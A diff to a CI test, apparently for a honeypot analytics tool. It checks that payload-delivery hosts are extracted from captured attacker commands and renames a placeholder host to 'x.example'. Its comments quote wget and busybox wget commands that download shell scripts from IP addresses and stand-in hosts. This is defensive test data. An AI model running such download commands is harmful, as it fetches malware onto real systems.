@@ -383,7 +383,7 @@ jobs:
 
           echo "--- payload delivery infrastructure ---"
           # The seed runs `wget http://1.2.3.4/bins.sh`,
-          # `busybox wget http://x/y.sh` and `wget http://9.8.7.6:8080/x`, so
+          # `busybox wget http://x.example/y.sh` and `wget http://9.8.7.6:8080/x`, so
           # three hosts must fall out: an address, a name, and an address on a
           # non-standard port.
           assert "200 payload-hosts" "200" "$(status "$PUB/payload-hosts")"
@@ -391,7 +391,7 @@ jobs:
           assert "the busiest host first" "1.2.3.4" "$(jq_get "$PUB/payload-hosts" '.rows[0].host')"
           assert "addresses are marked as such" "true" "$(jq_get "$PUB/payload-hosts" '.rows[0].is_ip')"
           assert "hostnames are not" "false" \
-            "$(jq_get "$PUB/payload-hosts" '[.rows[] | select(.host == "x")] | .[0].is_ip')"
+            "$(jq_get "$PUB/payload-hosts" '[.rows[] | select(.host == "x.example")] | .[0].is_ip')"
           assert "carries the URLs it found" "true" \
             "$(jq_get "$PUB/payload-hosts" '.rows[0].urls | any(contains("bins.sh"))')"
           # A host must never appear with a path or scheme still attached.
